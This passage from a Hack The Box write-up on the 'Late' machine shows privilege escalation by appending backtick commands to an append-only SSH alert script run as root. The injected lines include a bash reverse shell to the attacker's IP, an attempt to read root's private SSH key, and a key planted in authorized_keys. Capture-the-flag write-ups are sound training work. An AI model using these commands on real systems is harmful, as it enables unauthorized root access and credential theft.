</pre></table></code></div></div><p>I began my enumeration of the machine by checking out the code for the web app. The file <code class="language-plaintext highlighter-rouge">main.py</code> was the code for backend of the image processing site and contained a secret key <code class="language-plaintext highlighter-rouge">b'_5#y2L"F4Q8z\n\xec]/'</code>. I realized that this was pretty much the same as the secret key that I had leaked during one of my first code execution tests, but there seemed to be some character encoding in that one that made it hard to recognize.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>2022/07/24 17:47:27 CMD: UID=0    PID=10173  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/07/24 17:47:27 CMD: UID=0    PID=10176  | /bin/bash /usr/local/sbin/ssh-alert.sh 

2022/07/24 17:47:27 CMD: UID=0    PID=10178  | sendmail: MTA: ./26OHlRBY010177 from queue     
2022/07/24 17:47:27 CMD: UID=0    PID=10177  | sendmail: MTA: 26OHlRBZ010177 localhost.localdomain [127.0.0.1]: QUIT
2022/07/24 17:47:27 CMD: UID=0    PID=10179  | sshd: svc_acc [priv] 
2022/07/24 17:47:27 CMD: UID=0    PID=10180  | /etc/mail/smrsh/procmail -t -f svc_acc@new -a  -d root 
</pre></table></code></div></div><p>Next, I checked running processes; There seemed to be mail being sent which looked to potentially be an alert after I had used SSH to log in.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
  
<span class="nv">RECIPIENT</span><span class="o">=</span><span class="s2">"root@late.htb"</span>
<span class="nv">SUBJECT</span><span class="o">=</span><span class="s2">"Email from Server Login: SSH Alert"</span>

<span class="nv">BODY</span><span class="o">=</span><span class="s2">"
A SSH login was detected.

        User:        </span><span class="nv">$PAM_USER</span><span class="s2">
        User IP Host: </span><span class="nv">$PAM_RHOST</span><span class="s2">
        Service:     </span><span class="nv">$PAM_SERVICE</span><span class="s2">
        TTY:         </span><span class="nv">$PAM_TTY</span><span class="s2">
        Date:        </span><span class="sb">`</span><span class="nb">date</span><span class="sb">`</span><span class="s2">
        Server:      </span><span class="sb">`</span><span class="nb">uname</span> <span class="nt">-a</span><span class="sb">`</span><span class="s2">
"</span>

<span class="k">if</span> <span class="o">[</span> <span class="k">${</span><span class="nv">PAM_TYPE</span><span class="k">}</span> <span class="o">=</span> <span class="s2">"open_session"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Subject:</span><span class="k">${</span><span class="nv">SUBJECT</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">BODY</span><span class="k">}</span><span class="s2">"</span> | /usr/sbin/sendmail <span class="k">${</span><span class="nv">RECIPIENT</span><span class="k">}</span>
<span class="k">fi</span>

</pre></table></code></div></div><p>It was indeed what the script <code class="language-plaintext highlighter-rouge">/usr/local/sbin/ssh-alert.sh</code> seemed to be for. It would send an email to the user specified (<code class="language-plaintext highlighter-rouge">root</code> in the case of the running process I saw). I thought earlier that it was odd that this user would have SSH login enabled. It seemed like it was being monitored. It also looked like code could be run in the body of this email…I wondered if I could get the root user to execute commands for me by triggering an alert?</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>svc_acc@late:/dev/shm$ ls -la /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Jul 24 20:34 /usr/local/sbin/ssh-alert.sh
</pre></table></code></div></div><p>It did not appear as if I could write to this file, but when I opened it in vim earlier I did not get a read-only error as normal for files that you do not have write permissions for.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>"/usr/local/sbin/ssh-alert.sh"                                                          
WARNING: The file has been changed since reading it!!!
Do you really want to write to it (y/n)?y
"/usr/local/sbin/ssh-alert.sh" E212: Can't open file for writing
Press ENTER or type command to continue

</pre></table></code></div></div><p>I tried to save some changes to the file and got the error <code class="language-plaintext highlighter-rouge">E212: Can't open file for writing</code>. So the file was not writeable, but also was not read-only? This was strange behavior.</p><ul><li>https://knowledge.informatica.com/s/article/521629?language=en_US</ul><p>I did some research on this error message and found a knowledge center post which seemed to show a similar situation. It described using the command <code class="language-plaintext highlighter-rouge">lsattr</code> to check the file’s attributes to see if it had been marked as non-editable.</p><ul><li>https://howtoforge.com/linux-lsattr-command/</ul><blockquote><p>The letters ‘aAcCdDeijPsStTu’ select the new attributes for the files: append only (a), no atime updates (A), compressed (c), no copy on write (C), no dump (d), synchronous directory updates (D), extent format (e), immutable (i), data journalling (j), project hierarchy (P), secure deletion (s), synchronous updates (S), no tail-merging (t), top of directory hierarchy (T), and undeletable (u).</p><p>The following attributes are read-only, and may be listed by lsattr(1) but not modified by chattr: encrypted (E), indexed directory (I), and inline data (N).</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>svc_acc@late:/dev/shm$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
</pre></table></code></div></div><p>I checked the attributes of the file with <code class="language-plaintext highlighter-rouge">lsattr</code> and found that I was only able to append (<code class="language-plaintext highlighter-rouge">a</code>) the document, not directly write to it. This was why I was unable to save the file after editing it, but vim did not show the file as ‘read-only’.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>svc_acc@late:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'`echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDEkT7JxMDRMObKtE7+GuvBQGPHPnDmF7Yly0ZClqrdC &gt; /root/.ssh/authorized_keys`'</span> <span class="o">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh
</pre></table></code></div></div><p>Armed with knowledge, I decided to try to add my SSH public key to <code class="language-plaintext highlighter-rouge">root</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. I logged out of my SSH session and then back in to try to trigger the alert script again. After verifying that the script ran, I tried to SSH in as <code class="language-plaintext highlighter-rouge">root</code>. This did not work.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>svc_acc@late:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'`cat /root/.ssh/id_rsa &gt; /dev/shm/.test`'</span> <span class="o">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh

</pre></table></code></div></div><p>Next, I tried to send <code class="language-plaintext highlighter-rouge">root</code>’s potential SSH key to another file, but nothing appeared after forcing the script ro run again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># Authentication:</span>

<span class="c">#LoginGraceTime 2m</span>
PermitRootLogin no
<span class="c">#StrictModes yes</span>
<span class="c">#MaxAuthTries 6</span>
<span class="c">#MaxSessions 10</span>
</pre></table></code></div></div><p>I found the problem in the file <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code>: root was not allowed to login through SSH.</p><h3 id="getting-a-shell">Getting a shell</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>svc_acc@late:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'`bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.132/9001 0&gt;&amp;1"`'</span> <span class="o">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh
</pre></table></code></div></div><p>Next, I tried to get in directly by sending myself a reverse shell.</p><h3 id="roottxt">Root.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ nc -lvnp 9001                                                                    
listening on [any] 9001 ...
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.156] 48328
bash: cannot set terminal process group (13633): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# cat root.txt
cat root.txt
cat: root.txt: No such file or directory
root@late:/# ls -la
ls -la
total 104
drwxr-xr-x  23 root root  4096 Apr  7 13:51 .
drwxr-xr-x  23 root root  4096 Apr  7 13:51 ..
drwxr-xr-x   2 root root  4096 Apr 18 12:05 bin
drwxr-xr-x   4 root root  4096 Apr  7 12:08 boot
drwxr-xr-x   2 root root  4096 Jan  5  2022 cdrom
drwxr-xr-x  19 root root  3900 Jul 24 08:07 dev
drwxr-xr-x 121 root root 12288 Apr 18 12:05 etc
drwxr-xr-x   3 root root  4096 Jan  5  2022 home
lrwxrwxrwx   1 root root    34 Apr  7 12:08 initrd.img -&gt; boot/initrd.img-4.15.0-175-generic
lrwxrwxrwx   1 root root    34 Apr  7 12:08 initrd.img.old -&gt; boot/initrd.img-4.15.0-175-generic
drwxr-xr-x  21 root root  4096 Apr 18 12:05 lib
drwxr-xr-x   2 root root  4096 Apr  7 13:51 lib64
drwx------   2 root root 16384 Jan  5  2022 lost+found
drwxr-xr-x   2 root root  4096 Aug  6  2020 media
drwxr-xr-x   2 root root  4096 Apr  7 13:51 mnt
drwxr-xr-x   2 root root  4096 Jan 14  2022 opt
dr-xr-xr-x 194 root root     0 Jul 24 08:07 proc
drwx------   7 root root  4096 Apr 18 12:06 root
drwxr-xr-x  29 root root   880 Jul 24 08:08 run
drwxr-xr-x   2 root root 12288 Apr  7 11:33 sbin
drwxr-xr-x   2 root root  4096 Aug  6  2020 srv
dr-xr-xr-x  13 root root     0 Jul 24 15:48 sys
drwxrwxrwt  11 root root  4096 Jul 24 21:01 tmp
drwxr-xr-x  10 root root  4096 Aug  6  2020 usr
drwxr-xr-x  13 root root  4096 Apr  7 13:51 var
lrwxrwxrwx   1 root root    31 Apr  7 12:06 vmlinuz -&gt; boot/vmlinuz-4.15.0-175-generic
lrwxrwxrwx   1 root root    31 Apr  7 12:08 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-175-generic
root@late:/# cd root
cd root
root@late:/root# cat root.txt
cat root.txt
957038a09b2731b25aa2d4f26daf0001
</pre></table></code></div></div><p>Shortly afterwards, I was greeted by a shell on my waiting netcat listener, and was able to collect the root proof. Job complete!</p><p>Thanks to <a href="https://app.hackthebox.com/users/389926"><code class="language-plaintext highlighter-rouge">kavlglhan</code></a> for teaching me patience as a hacker. This machine required what seemed to be hundreds of iterations of testing different fonts, styles, colors, and sizes of the text to get the OCR to properly read every single character in my SSTI payload. It especially had difficulty with underscores and spacing between characters. Other than frustrations with the OCR, the machine was fairly simple and straightforward. I enjoyed learning about Jinja and SSTI, as well as the <code class="language-plaintext highlighter-rouge">lsattr</code> tool, which was new to me. These will certainly come in handy in the future.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_23_pwned.png" alt="proof zweilosec finished the machine late on hack the box" /></p><p>If you like this content and would like to see more, please consider <a href="https://www.buymeacoffee.com/zweilosec">buying me a coffee</a>!</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/ocr/" class="post-tag no-text-decoration" >ocr</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/flask/" class="post-tag no-text-decoration" >flask</a> <a href="/tags/jinja/" class="post-tag no-text-decoration" >jinja</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/template/" class="post-tag no-text-decoration" >template</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >injection</a> <a href="/tags/lsattr/" class="post-tag no-text-decoration" >lsattr</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Late Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/late/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Late Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/late/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Late Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/late/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forwardslash/"><div class="card-body"> <span class="timeago small" > Jun 6, 2020 <i class="unloaded">2020-06-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Forwardslash Writeup</h3><div class="text-muted small"><p> HTB - ForwardSlash Overview Useful Skills and Tools Enumeration Nmap scan I started my enumeration with an nmap scan of 10.10.10.183. The options I regularly use are: Flag ...</p></div></div></a></div><div class="card"> <a href="/posts/oouch/"><div class="card-body"> <span class="timeago small" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Oouch Writeup</h3><div class="text-muted small"><p> HTB - Oouch Overview This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence a...</p></div></div></a></div><div class="card"> <a href="/posts/cache/"><div class="card-body"> <span class="timeago small" > Aug 10, 2020 <i class="unloaded">2020-08-10T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cache Writeup</h3><div class="text-muted small"><p> HTB - Cache Overview Short description to include any strange things to be dealt with Useful Skills and Tools Useful thing 1 description with generic example Useful thing 2 descript...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/jekyll-chirpy-github-pages-blog/" class="btn btn-outline-primary" prompt="Older"><p>How to use GitHub Pages to host a blog with Jekyll Chirpy theme</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
